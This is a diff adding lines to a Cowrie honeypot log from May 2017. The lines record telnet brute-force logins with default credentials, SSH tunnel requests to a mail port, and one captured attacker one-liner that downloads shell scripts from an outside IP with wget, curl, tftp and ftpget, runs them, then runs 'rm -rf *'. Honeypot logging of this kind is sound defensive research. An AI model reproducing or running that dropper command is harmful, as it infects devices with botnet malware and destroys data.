@@ -1498,3 +1498,39 @@
 2017-05-27T06:32:41+0000 [CowrieTelnetTransport,118814,212.237.27.16] Connection lost after 16 seconds
 2017-05-27T06:32:41+0000 [Uninitialized] Connection was probably lost. Could not write to terminal
 2017-05-27T06:32:41+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://107.173.209.45/fyfa.sh>
+2017-05-27T06:33:47+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,134023,91.195.103.215] got channel 'direct-tcpip' request
+2017-05-27T06:33:47+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,134023,91.195.103.215] direct-tcp connection request to 66.196.118.37:25 from localhost:5556
+2017-05-27T06:33:50+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.237.27.16:34453 (10.8.41.81:2223) [session: TT118817]
+2017-05-27T06:33:50+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.237.27.16:42056 (10.8.41.81:2223) [session: TT118818]
+2017-05-27T06:33:52+0000 [SSHChannel None (50) on SSHService 'ssh-connection' on HoneyPotSSHTransport,134023,91.195.103.215] remote eof
+2017-05-27T06:33:52+0000 [SSHChannel None (50) on SSHService 'ssh-connection' on HoneyPotSSHTransport,134023,91.195.103.215] remote close
+2017-05-27T06:33:52+0000 [SSHChannel None (50) on SSHService 'ssh-connection' on HoneyPotSSHTransport,134023,91.195.103.215] sending close 50
+2017-05-27T06:33:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,134023,91.195.103.215] got channel 'direct-tcpip' request
+2017-05-27T06:33:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,134023,91.195.103.215] direct-tcp connection request to 66.196.118.37:25 from localhost:5556
+2017-05-27T06:33:55+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 212.237.27.16:39604 (10.8.41.81:2223) [session: TT118819]
+2017-05-27T06:33:55+0000 [CowrieTelnetTransport,118817,212.237.27.16] login attempt: 6
+2017-05-27T06:33:55+0000 [CowrieTelnetTransport,118817,212.237.27.16] login return, expect: [root/54321]
+2017-05-27T06:33:56+0000 [CowrieTelnetTransport,118817,212.237.27.16] login attempt [root/54321] succeeded
+2017-05-27T06:33:58+0000 [CowrieTelnetTransport,118817,212.237.27.16] Opening TTY Log: log/tty/20170527-063358-None-118817i.log
+2017-05-27T06:33:58+0000 [CowrieTelnetTransport,118817,212.237.27.16] Warning: state changed and new state returned
+2017-05-27T06:33:58+0000 [CowrieTelnetTransport,118818,212.237.27.16] login attempt: 7
+2017-05-27T06:33:58+0000 [CowrieTelnetTransport,118818,212.237.27.16] login return, expect: [root/54321]
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118818,212.237.27.16] login attempt [admin/5up] failed
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118818,212.237.27.16] Warning: state changed and new state returned
+2017-05-27T06:34:00+0000 [SSHChannel None (51) on SSHService 'ssh-connection' on HoneyPotSSHTransport,134023,91.195.103.215] remote eof
+2017-05-27T06:34:00+0000 [SSHChannel None (51) on SSHService 'ssh-connection' on HoneyPotSSHTransport,134023,91.195.103.215] remote close
+2017-05-27T06:34:00+0000 [SSHChannel None (51) on SSHService 'ssh-connection' on HoneyPotSSHTransport,134023,91.195.103.215] sending close 51
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] CMD: enable
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] Command found: enable 
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] Reading txtcmd from "txtcmds/bin/enable"
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] CMD: shell
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] Command not found: shell
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] CMD: sh
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] Command found: sh 
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] CMD: cd /tmp; wget http://107.173.209.45/fyfa.sh; curl -O http://107.173.209.45/fyfa.sh; chmod 777 fyfa.sh; sh fyfa.sh; tftp 107.173.209.45 -c get tfyfa.sh; chmod 777 tfyfa.sh; sh tfyfa.sh; tftp -r tfyfa2.sh -g 107.173.209.45; chmod 777 tfyfa2.sh; sh tfyfa2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.173.209.45 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf fyfa.sh tfyfa.sh tfyfa2.sh ftp1.sh; rm -rf *
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] Command found: cd /tmp
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] Command found: wget http://107.173.209.45/fyfa.sh
+2017-05-27T06:34:00+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.173.209.45/fyfa.sh>
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118817,212.237.27.16] QUEUED INPUT: /bin/busybox ECCHI
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118818,212.237.27.16] login attempt: 8
+2017-05-27T06:34:00+0000 [CowrieTelnetTransport,118818,212.237.27.16] login return, expect: [root/54321]
